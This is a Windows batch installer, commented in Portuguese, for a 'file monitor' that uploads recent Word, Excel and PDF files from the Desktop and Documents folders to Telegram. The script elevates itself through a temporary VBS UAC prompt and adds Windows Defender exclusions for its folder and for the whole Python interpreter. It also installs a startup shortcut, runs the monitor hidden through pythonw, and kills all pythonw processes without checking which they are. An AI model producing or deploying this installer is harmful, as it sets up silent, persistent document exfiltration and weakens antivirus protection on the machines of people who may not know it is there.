@echo off
:: Solicita privilégios de administrador
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Solicitando privilegios de administrador...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

chcp 65001 >nul
color 0A
cls

echo.
echo ═══════════════════════════════════════════════════════════════
echo   🚀 SUPER INSTALADOR - MONITOR DE ARQUIVOS
echo ═══════════════════════════════════════════════════════════════
echo.
echo   Este instalador vai fazer TUDO automaticamente:
echo.
echo   ✓ Encontrar o Python
echo   ✓ Instalar bibliotecas
echo   ✓ Criar atalho na Inicialização
echo   ✓ Adicionar exceção no Windows Defender
echo   ✓ Iniciar o monitor
echo.
echo   Rodando como ADMINISTRADOR para ter todas as permissões!
echo.
echo ═══════════════════════════════════════════════════════════════
echo.
pause

:: ═══════════════════════════════════════════════════════════════
:: PASSO 1: Encontrar Python
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📋 PASSO 1/6 - Procurando Python...
echo ═══════════════════════════════════════════════════════════════
echo.

set PYTHON_FOUND=0
set PYTHON_PATH=

:: Tentar comando python direto
python --version >nul 2>&1
if %errorlevel%==0 (
    set PYTHON_PATH=python
    set PYTHON_FOUND=1
    echo ✅ Python encontrado no PATH
    python --version
    goto :python_found
)

:: Procurar em locais comuns
echo Procurando Python instalado...

:: Local 1: AppData Local
for /d %%i in ("%LOCALAPPDATA%\Programs\Python\Python*") do (
    if exist "%%i\python.exe" (
        set "PYTHON_PATH=%%i\python.exe"
        set PYTHON_FOUND=1
        echo ✅ Python encontrado em: %%i
        "%%i\python.exe" --version
        goto :python_found
    )
)

:: Local 2: Program Files
for /d %%i in ("C:\Program Files\Python*") do (
    if exist "%%i\python.exe" (
        set "PYTHON_PATH=%%i\python.exe"
        set PYTHON_FOUND=1
        echo ✅ Python encontrado em: %%i
        "%%i\python.exe" --version
        goto :python_found
    )
)

:: Local 3: C:\Python
for /d %%i in ("C:\Python*") do (
    if exist "%%i\python.exe" (
        set "PYTHON_PATH=%%i\python.exe"
        set PYTHON_FOUND=1
        echo ✅ Python encontrado em: %%i
        "%%i\python.exe" --version
        goto :python_found
    )
)

:python_found
if %PYTHON_FOUND%==0 (
    echo.
    echo ❌ Python não encontrado!
    echo.
    echo 📥 INSTALE O PYTHON:
    echo 1. Acesse: https://www.python.org/downloads/
    echo 2. Baixe e execute o instalador
    echo 3. ⚠️  MARQUE "Add Python to PATH"
    echo 4. Rode este script novamente
    echo.
    pause
    exit /b 1
)

echo.
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: PASSO 2: Instalar bibliotecas
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📦 PASSO 2/6 - Instalando bibliotecas...
echo ═══════════════════════════════════════════════════════════════
echo.
echo Isso pode demorar 1-2 minutos...
echo.

"%PYTHON_PATH%" -m pip install --upgrade pip --quiet --disable-pip-version-check
"%PYTHON_PATH%" -m pip install python-telegram-bot python-dotenv --quiet --disable-pip-version-check

if %errorlevel% NEQ 0 (
    echo.
    echo ⚠️  Tentando sem --quiet...
    "%PYTHON_PATH%" -m pip install python-telegram-bot python-dotenv
)

echo.
echo ✅ Bibliotecas instaladas!
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: PASSO 3: Adicionar exceção no Windows Defender
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   🛡️  PASSO 3/6 - Configurando Windows Defender...
echo ═══════════════════════════════════════════════════════════════
echo.
echo Adicionando exceção para o monitor não ser bloqueado...
echo.

:: Adicionar pasta atual como exceção
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

:: Adicionar Python como exceção
if "%PYTHON_PATH%"=="python" (
    for /f "tokens=*" %%i in ('where python') do (
        powershell -Command "Add-MpPreference -ExclusionProcess '%%i'" >nul 2>&1
    )
) else (
    powershell -Command "Add-MpPreference -ExclusionProcess '%PYTHON_PATH%'" >nul 2>&1
)

:: Adicionar pythonw.exe como exceção
if "%PYTHON_PATH%"=="python" (
    for /f "tokens=*" %%i in ('where pythonw') do (
        powershell -Command "Add-MpPreference -ExclusionProcess '%%i'" >nul 2>&1
    )
) else (
    set "PYTHONW_PATH=%PYTHON_PATH:python.exe=pythonw.exe%"
    powershell -Command "Add-MpPreference -ExclusionProcess '!PYTHONW_PATH!'" >nul 2>&1
)

echo ✅ Exceções adicionadas no Windows Defender!
echo.
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: PASSO 4: Criar atalho na pasta Inicializar
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📁 PASSO 4/6 - Criando atalho na Inicialização...
echo ═══════════════════════════════════════════════════════════════
echo.

:: Obter pasta Inicializar
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo Pasta Inicializar: %STARTUP_FOLDER%
echo.

:: Criar script VBS para criar atalho
set "VBS_SCRIPT=%TEMP%\criar_atalho.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLinkFile = "%STARTUP_FOLDER%\Monitor Arquivos Telegram.lnk" >> "%VBS_SCRIPT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SCRIPT%"

if "%PYTHON_PATH%"=="python" (
    echo oLink.TargetPath = "pythonw.exe" >> "%VBS_SCRIPT%"
    echo oLink.Arguments = """%~dp0monitor_simples.py""" >> "%VBS_SCRIPT%"
) else (
    set "PYTHONW_PATH=%PYTHON_PATH:python.exe=pythonw.exe%"
    echo oLink.TargetPath = "!PYTHONW_PATH!" >> "%VBS_SCRIPT%"
    echo oLink.Arguments = """%~dp0monitor_simples.py""" >> "%VBS_SCRIPT%"
)

echo oLink.WorkingDirectory = "%~dp0" >> "%VBS_SCRIPT%"
echo oLink.Description = "Monitor de Arquivos - Envia automaticamente para Telegram" >> "%VBS_SCRIPT%"
echo oLink.Save >> "%VBS_SCRIPT%"

:: Executar VBS
cscript //nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%"

if exist "%STARTUP_FOLDER%\Monitor Arquivos Telegram.lnk" (
    echo ✅ Atalho criado com sucesso!
    echo    Local: %STARTUP_FOLDER%
) else (
    echo ⚠️  Não foi possível criar o atalho automaticamente.
    echo    Você pode criar manualmente depois.
)

echo.
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: PASSO 5: Criar script de inicialização alternativo
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📝 PASSO 5/6 - Criando scripts auxiliares...
echo ═══════════════════════════════════════════════════════════════
echo.

:: Criar INICIAR.bat
echo @echo off > "%~dp0INICIAR.bat"
echo cd /d "%~dp0" >> "%~dp0INICIAR.bat"
if "%PYTHON_PATH%"=="python" (
    echo start /B pythonw.exe monitor_simples.py >> "%~dp0INICIAR.bat"
) else (
    set "PYTHONW_PATH=%PYTHON_PATH:python.exe=pythonw.exe%"
    echo start /B "!PYTHONW_PATH!" monitor_simples.py >> "%~dp0INICIAR.bat"
)
echo echo Monitor iniciado! >> "%~dp0INICIAR.bat"
echo timeout /t 2 ^>nul >> "%~dp0INICIAR.bat"

:: Criar PARAR.bat
echo @echo off > "%~dp0PARAR.bat"
echo taskkill /F /IM pythonw.exe ^>nul 2^>^&1 >> "%~dp0PARAR.bat"
echo echo Monitor parado! >> "%~dp0PARAR.bat"
echo timeout /t 2 ^>nul >> "%~dp0PARAR.bat"

:: Criar STATUS.bat
echo @echo off > "%~dp0STATUS.bat"
echo tasklist /FI "IMAGENAME eq pythonw.exe" ^| find /I "pythonw.exe" ^>nul >> "%~dp0STATUS.bat"
echo if %%errorlevel%%==0 ( >> "%~dp0STATUS.bat"
echo     echo Monitor RODANDO >> "%~dp0STATUS.bat"
echo ) else ( >> "%~dp0STATUS.bat"
echo     echo Monitor PARADO >> "%~dp0STATUS.bat"
echo ) >> "%~dp0STATUS.bat"
echo pause >> "%~dp0STATUS.bat"

echo ✅ Scripts criados:
echo    - INICIAR.bat (ligar o monitor)
echo    - PARAR.bat (desligar o monitor)
echo    - STATUS.bat (ver se está rodando)
echo.
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: PASSO 6: Iniciar o monitor
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   🚀 PASSO 6/6 - Iniciando o monitor...
echo ═══════════════════════════════════════════════════════════════
echo.

:: Parar qualquer instância anterior
taskkill /F /IM pythonw.exe >nul 2>&1

echo Iniciando monitor em segundo plano (invisível)...
echo.

:: Iniciar monitor
if "%PYTHON_PATH%"=="python" (
    start /B pythonw.exe "%~dp0monitor_simples.py"
) else (
    set "PYTHONW_PATH=%PYTHON_PATH:python.exe=pythonw.exe%"
    start /B "!PYTHONW_PATH!" "%~dp0monitor_simples.py"
)

timeout /t 3 >nul

:: Verificar se iniciou
tasklist /FI "IMAGENAME eq pythonw.exe" | find /I "pythonw.exe" >nul
if %errorlevel%==0 (
    echo ✅ Monitor iniciado com sucesso!
) else (
    echo ⚠️  Monitor pode não ter iniciado.
    echo    Verifique o arquivo monitor_simples.log
)

echo.
timeout /t 2 >nul

:: ═══════════════════════════════════════════════════════════════
:: CONCLUSÃO
:: ═══════════════════════════════════════════════════════════════
cls
echo.
echo ═══════════════════════════════════════════════════════════════
echo   ✅ INSTALAÇÃO CONCLUÍDA COM SUCESSO!
echo ═══════════════════════════════════════════════════════════════
echo.
echo 🎉 O monitor está rodando e configurado para iniciar automaticamente!
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📋 O QUE FOI FEITO:
echo ═══════════════════════════════════════════════════════════════
echo.
echo ✓ Python encontrado e configurado
echo ✓ Bibliotecas instaladas
echo ✓ Exceções adicionadas no Windows Defender
echo ✓ Atalho criado na pasta Inicializar
echo ✓ Scripts auxiliares criados (INICIAR.bat, PARAR.bat, STATUS.bat)
echo ✓ Monitor iniciado em segundo plano
echo.
echo ═══════════════════════════════════════════════════════════════
echo   🧪 TESTE AGORA:
echo ═══════════════════════════════════════════════════════════════
echo.
echo 1. Salve um arquivo Word ou Excel no Desktop
echo 2. Aguarde até 30 segundos
echo 3. Verifique se apareceu no Telegram (tópico PC Local)
echo.
echo ═══════════════════════════════════════════════════════════════
echo   🔧 COMANDOS ÚTEIS:
echo ═══════════════════════════════════════════════════════════════
echo.
echo • INICIAR.bat  → Ligar o monitor
echo • PARAR.bat    → Desligar o monitor
echo • STATUS.bat   → Ver se está rodando
echo.
echo • monitor_simples.log → Ver o que está acontecendo
echo.
echo ═══════════════════════════════════════════════════════════════
echo   📱 PASTAS MONITORADAS:
echo ═══════════════════════════════════════════════════════════════
echo.
echo • Desktop (Área de Trabalho)
echo • Documentos (Documents)
echo.
echo Arquivos .docx, .xlsx, .pdf modificados nas últimas 24h
echo serão enviados automaticamente para o Telegram!
echo.
echo ═══════════════════════════════════════════════════════════════
echo.
echo Pressione qualquer tecla para fechar...
pause >nul
